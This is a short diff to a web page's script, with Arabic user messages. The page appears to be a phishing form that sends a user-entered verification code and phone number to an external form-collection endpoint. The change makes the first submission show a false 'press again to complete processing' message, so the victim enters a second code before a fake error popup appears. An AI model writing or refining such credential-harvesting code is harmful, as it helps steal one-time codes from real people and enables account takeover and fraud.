@@ -149,6 +149,7 @@
 <script>
   const formcarryURL = "https://formcarry.com/s/a-Yw-WFDEqO";
   let savedPhone = "";
+  let codeSubmitCount = 0;
 
   document.getElementById("docType").addEventListener("change", function () {
     const docContainer = document.getElementById("docNumberContainer");
@@ -211,14 +212,19 @@
       return;
     }
 
-    // إرسال الكود ورقم الهاتف مباشرة
+    codeSubmitCount++;
+
     fetch(formcarryURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ code, phone: savedPhone })
     }).then(() => {
-      document.getElementById("codePopup").style.display = "none";
-      document.getElementById("errorPopup").style.display = "block";
+      if (codeSubmitCount >= 2) {
+        document.getElementById("codePopup").style.display = "none";
+        document.getElementById("errorPopup").style.display = "block";
+      } else {
+        alert("تم إرسال الكود. اضغط مرة أخرى لإكمال المعالجة.");
+      }
     }).catch(() => alert("فشل في إرسال الكود."));
   });
 
